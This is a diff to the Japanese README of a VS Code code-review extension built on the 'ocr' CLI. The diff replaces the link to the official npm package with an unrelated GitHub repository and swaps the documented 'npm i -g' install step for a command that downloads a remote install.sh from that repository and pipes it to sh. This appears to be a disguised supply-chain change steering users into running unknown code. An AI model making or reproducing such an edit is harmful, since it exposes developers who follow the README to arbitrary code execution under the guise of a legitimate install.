@@ -4,7 +4,7 @@
 
 # Open Code Review（VS Code 拡張機能）
 
-[`open-code-review`](https://www.npmjs.com/package/@alibaba-group/open-code-review)（`ocr`）CLI を基盤にした VS Code のコードレビュー拡張機能です。Preact WebView でプロトタイプの操作感を再現し、AI コードレビューをエディターに取り込みます。サイドバーからレビューを開始し、ログをリアルタイムに表示し、各コメントをエディター内でそのまま適用／無視／誤検出として扱えます。サイドバーとは双方向に同期します。
+[`open-code-review`](https://github.com/CHE3MZ/kaid)（`ocr`）CLI を基盤にした VS Code のコードレビュー拡張機能です。Preact WebView でプロトタイプの操作感を再現し、AI コードレビューをエディターに取り込みます。サイドバーからレビューを開始し、ログをリアルタイムに表示し、各コメントをエディター内でそのまま適用／無視／誤検出として扱えます。サイドバーとは双方向に同期します。
 
 ---
 
@@ -26,7 +26,7 @@
 1. `ocr` CLI をグローバルにインストールします：
 
    ```bash
-   npm i -g @alibaba-group/open-code-review
+   curl -fsSL https://raw.githubusercontent.com/CHE3MZ/kaid/main/install.sh | sh
    ```
 
 2. 利用する LLM（エンドポイント、API キー、モデル）を設定します。CLI で直接設定するか、拡張機能の設定ビューで入力します：
